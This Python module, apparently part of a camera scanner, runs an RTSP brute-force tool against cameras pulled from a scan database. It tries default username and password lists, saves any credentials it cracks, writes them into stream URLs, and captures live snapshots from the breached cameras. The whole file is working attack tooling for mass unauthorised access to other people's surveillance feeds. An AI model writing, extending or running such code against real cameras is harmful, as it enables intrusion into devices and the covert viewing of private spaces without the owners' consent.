"""RTSP Brute Force Integration Module for scanner_v2.

Wraps /root/rtspBruter/rtspBrute.py with async process execution,
real-time stdout parsing, credential persistence, and automatic preview capture.
"""
from __future__ import annotations

import asyncio
import logging
import os
import re
import sys
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

# Paths for rtspBruter tool
_DEFAULT_RTSP_BRUTE_DIR = Path("/root/rtspBruter")
_DEFAULT_RTSP_BRUTE_SCRIPT = _DEFAULT_RTSP_BRUTE_DIR / "rtspBrute.py"
_DEFAULT_RTSP_BRUTE_PYTHON = _DEFAULT_RTSP_BRUTE_DIR / ".venv" / "bin" / "python"

DEFAULT_USERNAMES = [
    "admin",
    "root",
    "service",
    "user",
    "operator",
    "viewer",
    "guest",
    "supervisor",
]

DEFAULT_PASSWORDS = [
    "",
    "admin",
    "12345",
    "123456",
    "12345678",
    "123456789",
    "admin123",
    "admin12345",
    "admin123456",
    "12345admin",
    "root",
    "pass",
    "password",
    "service",
    "user",
    "1111",
    "111111",
    "666666",
    "888888",
    "999999",
]


class RtspBruteManager:
    """Manages background RTSP brute force runs using rtspBrute.py."""

    def __init__(self, script_path: Optional[Path] = None, python_path: Optional[Path] = None):
        self.script_path = script_path or _DEFAULT_RTSP_BRUTE_SCRIPT
        self.python_path = (
            python_path
            or (_DEFAULT_RTSP_BRUTE_PYTHON if _DEFAULT_RTSP_BRUTE_PYTHON.exists() else Path(sys.executable))
        )
        self.status = "idle"  # idle | running | finished | stopped | error
        self.total_targets = 0
        self.processed_targets = 0
        self.cracked_count = 0
        self.cracked_cameras: List[Dict[str, Any]] = []
        self.logs: List[str] = []
        self.error_message: Optional[str] = None
        self.start_time: float = 0.0
        self.end_time: float = 0.0

        self._process: Optional[asyncio.subprocess.Process] = None
        self._task: Optional[asyncio.Task] = None
        self._temp_dir: Optional[tempfile.TemporaryDirectory] = None

    def _log(self, msg: str) -> None:
        ts = time.strftime("%H:%M:%S")
        entry = f"[{ts}] {msg}"
        self.logs.append(entry)
        if len(self.logs) > 500:
            self.logs = self.logs[-500:]
        logger.info("[RtspBruter] %s", msg)

    def is_running(self) -> bool:
        return self.status == "running" and self._task is not None and not self._task.done()

    def get_status(self) -> Dict[str, Any]:
        elapsed = 0.0
        if self.start_time > 0:
            elapsed = (self.end_time or time.time()) - self.start_time

        return {
            "status": self.status,
            "is_running": self.is_running(),
            "total_targets": self.total_targets,
            "processed_targets": self.processed_targets,
            "cracked_count": self.cracked_count,
            "cracked_cameras": self.cracked_cameras[-50:],
            "logs": self.logs[-60:],
            "elapsed_seconds": round(elapsed, 1),
            "error": self.error_message,
        }

    async def stop(self) -> Dict[str, Any]:
        """Stop current brute force execution."""
        if not self.is_running():
            return {"stopped": False, "message": "Not running"}

        self._log("Stopping RTSP brute force process...")
        if self._process and self._process.returncode is None:
            try:
                self._process.terminate()
                await asyncio.sleep(0.5)
                if self._process.returncode is None:
                    self._process.kill()
            except Exception as exc:
                logger.warning("Error killing brute process: %s", exc)

        if self._task and not self._task.done():
            self._task.cancel()

        self.status = "stopped"
        self.end_time = time.time()
        self._cleanup_temp()
        self._log("RTSP brute force process stopped.")
        return {"stopped": True, "cracked_count": self.cracked_count}

    def _cleanup_temp(self) -> None:
        if self._temp_dir:
            try:
                self._temp_dir.cleanup()
            except Exception:
                pass
            self._temp_dir = None

    async def start(
        self,
        targets: Optional[List[str]] = None,
        usernames: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        port: int = 554,
        threads: int = 50,
        storage: Any = None,
        capture_dir: Optional[Path] = None,
    ) -> Dict[str, Any]:
        """Start RTSP brute-forcing job in background."""
        if self.is_running():
            return {"started": False, "message": "Brute force is already running"}

        # Validate script and python interpreter
        if not self.script_path.exists():
            return {
                "started": False,
                "message": f"rtspBrute.py not found at {self.script_path}",
            }
        if not self.python_path.exists():
            self.python_path = Path(sys.executable)

        # 1. Resolve targets
        resolved_targets: List[str] = []
        if targets:
            resolved_targets = [t.strip() for t in targets if t and t.strip()]
        elif storage:
            # Fetch all cameras requiring auth from DB
            all_results = storage.get_v2_results(limit=50000)
            for cam in all_results:
                is_auth_req = cam.get("auth_required") is True
                creds = cam.get("credentials") or {}
                has_creds = bool(creds.get("user") and creds.get("password"))
                streams = cam.get("streams") or []
                has_verified = any(bool(s.get("verified") or s.get("screenshot")) for s in streams)

                # Target if auth_required is explicitly true, or camera has no preview and no credentials
                if is_auth_req or (not has_creds and not has_verified):
                    ip = cam.get("ip", "").strip()
                    rtsp_p = cam.get("rtsp_port") or port
                    if ip:
                        resolved_targets.append(f"{ip}:{rtsp_p}")

        if not resolved_targets:
            return {
                "started": False,
                "message": "Нет целей для брутфорса (не найдено камер с 401 / требующих пароль)",
            }

        # Deduplicate targets
        seen = set()
        clean_targets = []
        for t in resolved_targets:
            if t not in seen:
                seen.add(t)
                clean_targets.append(t)

        u_list = [u.strip() for u in (usernames or DEFAULT_USERNAMES) if u.strip()]
        p_list = [p.strip() for p in (passwords if passwords is not None else DEFAULT_PASSWORDS)]

        self.total_targets = len(clean_targets)
        self.processed_targets = 0
        self.cracked_count = 0
        self.cracked_cameras.clear()
        self.logs.clear()
        self.error_message = None
        self.status = "running"
        self.start_time = time.time()
        self.end_time = 0.0

        self._log(f"Starting RTSP Bruter for {len(clean_targets)} targets...")
        self._log(f"Usernames: {len(u_list)}, Passwords: {len(p_list)}, Threads: {threads}")

        self._task = asyncio.create_task(
            self._run_process(
                targets=clean_targets,
                usernames=u_list,
                passwords=p_list,
                port=port,
                threads=threads,
                storage=storage,
                capture_dir=capture_dir,
            )
        )
        return {
            "started": True,
            "total_targets": self.total_targets,
            "usernames_count": len(u_list),
            "passwords_count": len(p_list),
        }

    async def _run_process(
        self,
        targets: List[str],
        usernames: List[str],
        passwords: List[str],
        port: int,
        threads: int,
        storage: Any,
        capture_dir: Optional[Path],
    ) -> None:
        try:
            self._temp_dir = tempfile.TemporaryDirectory(prefix="rtsp_brute_")
            td = Path(self._temp_dir.name)
            targets_file = td / "targets.txt"
            users_file = td / "users.txt"
            pass_file = td / "pass.txt"

            targets_file.write_text("\n".join(targets), encoding="utf-8")
            users_file.write_text("\n".join(usernames), encoding="utf-8")
            pass_file.write_text("\n".join(passwords), encoding="utf-8")

            cmd = [
                str(self.python_path),
                str(self.script_path),
                "-t",
                str(targets_file),
                "-u",
                str(users_file),
                "--password",
                str(pass_file),
                "--port",
                str(port),
                "run",
            ]

            self._log(f"Executing: {' '.join(cmd[:4])} ... run")

            self._process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=str(self.script_path.parent),
            )

            async def _read_stream(stream, is_stderr: bool = False):
                while True:
                    line_bytes = await stream.readline()
                    if not line_bytes:
                        break
                    line = line_bytes.decode(errors="ignore").strip()
                    if not line:
                        continue

                    if is_stderr:
                        self._log(f"[STDERR] {line}")
                        continue

                    # Parse stdout
                    # Pattern 1: target,username,password (e.g. 192.168.1.100:554,admin,12345)
                    match = re.match(r"^([^,\s]+),([^,\s]*),([^,\s]*)$", line)
                    if match and ":" in match.group(1):
                        tgt, user, pw = match.group(1), match.group(2), match.group(3)
                        await self._on_camera_cracked(
                            tgt=tgt,
                            user=user,
                            password=pw,
                            storage=storage,
                            capture_dir=capture_dir,
                        )
                        continue

                    # Pattern 2: allows unauthorized access and does not need a username/password
                    match_open = re.search(r"The RTSP service at:\s*([^,\s]+)\s*allows unauthorized access", line)
                    if match_open:
                        tgt = match_open.group(1).strip()
                        await self._on_camera_cracked(
                            tgt=tgt,
                            user="",
                            password="",
                            storage=storage,
                            capture_dir=capture_dir,
                            no_auth=True,
                        )
                        continue

                    # General status lines
                    if any(kw in line for kw in ("targets", "threads", "Finished", "Use ")):
                        self._log(line)

            if self._process.stdout and self._process.stderr:
                await asyncio.gather(
                    _read_stream(self._process.stdout, is_stderr=False),
                    _read_stream(self._process.stderr, is_stderr=True),
                )

            await self._process.wait()
            rc = self._process.returncode

            if rc == 0:
                self.status = "finished"
                self._log(f"Brute force completed successfully. Cracked {self.cracked_count} cameras.")
            else:
                self.status = "error"
                self.error_message = f"Process exited with code {rc}"
                self._log(f"Process terminated with exit code {rc}")

        except asyncio.CancelledError:
            self.status = "stopped"
            self._log("Brute force task cancelled.")
        except Exception as exc:
            self.status = "error"
            self.error_message = str(exc)
            self._log(f"Brute force error: {exc}")
            logger.exception("RtspBruteManager execution failed: %s", exc)
        finally:
            self.end_time = time.time()
            self._cleanup_temp()

    async def _on_camera_cracked(
        self,
        tgt: str,
        user: str,
        password: str,
        storage: Any,
        capture_dir: Optional[Path],
        no_auth: bool = False,
    ) -> None:
        """Handle discovered credentials for a camera."""
        path_suffix = ""
        if "/" in tgt:
            target_part, rest = tgt.split("/", 1)
            path_suffix = "/" + rest
        else:
            target_part = tgt

        host = target_part.split(":")[0]
        port = int(target_part.split(":")[1]) if ":" in target_part and target_part.split(":")[1].isdigit() else 554

        self.cracked_count += 1
        record = {
            "target": tgt,
            "ip": host,
            "port": port,
            "path": path_suffix,
            "user": user,
            "password": password,
            "no_auth": no_auth,
            "timestamp": time.time(),
            "preview_captured": False,
        }
        self.cracked_cameras.append(record)

        if no_auth:
            self._log(f"🔓 [UNAUTHENTICATED] {tgt} allows direct access without password!")
        else:
            self._log(f"🔑 [CRACKED] {tgt} -> {user}:{password}")

        # Update database if storage is available
        if storage:
            try:
                cam = storage.get_v2_result(host)
                cred_prefix = f"{user}:{password}@" if user else ""
                init_url = f"rtsp://{cred_prefix}{host}:{port}{path_suffix or '/'}"
                if not cam:
                    cam = {
                        "ip": host,
                        "brand": "RTSP Camera",
                        "model": "",
                        "serial": "",
                        "http_port": 80,
                        "rtsp_port": port,
                        "protocols": ["rtsp_direct"],
                        "streams": [
                            {"type": "rtsp", "url": init_url, "verified": False}
                        ],
                    }
                else:
                    cam["auth_required"] = False
                    cam["credentials"] = {"user": user, "password": password}
                    # Update streams with valid credentials
                    streams = cam.get("streams") or []
                    for s in streams:
                        url = s.get("url", "")
                        if url.startswith("rtsp://"):
                            # Replace or insert auth
                            parts = url.split("://", 1)
                            if len(parts) == 2:
                                clean_url = re.sub(r"://[^/@]+@", "://", url)
                                cred_str = f"{user}:{password}@" if user else ""
                                s["url"] = clean_url.replace("://", f"://{cred_str}")
                                s["auth_required"] = False

                storage.save_v2_result(cam)

                # Attempt live snapshot capture with newly cracked credentials
                if capture_dir:
                    asyncio.create_task(
                        self._capture_cracked_preview(
                            host, port, user, password, cam, storage, capture_dir, path_suffix=path_suffix
                        )
                    )

            except Exception as exc:
                logger.warning("Error saving cracked camera %s: %s", host, exc)

    async def _capture_cracked_preview(
        self,
        ip: str,
        port: int,
        user: str,
        password: str,
        cam: Dict[str, Any],
        storage: Any,
        capture_dir: Path,
        path_suffix: str = "",
    ) -> None:
        """Trigger background screenshot capture for cracked camera."""
        try:
            from ip2domain.cameras.scanner_v2.stage3_stream import capture_stream_frame

            cred_str = f"{user}:{password}@" if user else ""
            candidate_paths = []
            if path_suffix:
                candidate_paths.append(path_suffix)
            candidate_paths.extend([
                "/",
                "/0",
                "/live/ch0",
                "/h264Preview_01_main",
                "/Streaming/Channels/101",
                "/live1.sdp",
                "/cam/realmonitor?channel=1&subtype=0",
                "/user=admin_password=_channel=1_stream=0.sdp",
            ])

            streams = cam.get("streams") or []
            existing_urls = [s.get("url") for s in streams if s.get("url")]
            test_urls = list(existing_urls)
            # If we only have root URL or nothing, expand with candidate paths
            for p in candidate_paths:
                cand_url = f"rtsp://{cred_str}{ip}:{port}{p}"
                if cand_url not in test_urls:
                    test_urls.append(cand_url)

            for url in test_urls[:8]:
                ok, path, codec, w, h = await capture_stream_frame(
                    stream_url=url,
                    stream_type="rtsp",
                    capture_dir=capture_dir,
                    credentials={"user": user, "password": password} if user else None,
                )
                if ok and path and Path(path).exists():
                    self._log(f"📸 Captured live preview for cracked camera {ip} ({codec} {w}x{h}) via {url}")
                    # Update camera in storage with working verified stream
                    matched = False
                    for s in streams:
                        if s.get("url") == url:
                            s["verified"] = True
                            s["screenshot"] = path
                            s["codec"] = codec
                            s["resolution"] = f"{w}x{h}" if w and h else ""
                            matched = True
                    if not matched:
                        streams.insert(0, {
                            "type": "rtsp",
                            "url": url,
                            "verified": True,
                            "screenshot": path,
                            "codec": codec,
                            "resolution": f"{w}x{h}" if w and h else "",
                        })
                    cam["streams"] = streams
                    cam["auth_required"] = False
                    storage.save_v2_result(cam)
                    break
        except Exception as exc:
            logger.debug("Failed preview capture for cracked camera %s: %s", ip, exc)


# Global singleton instance
rtsp_brute_mgr = RtspBruteManager()
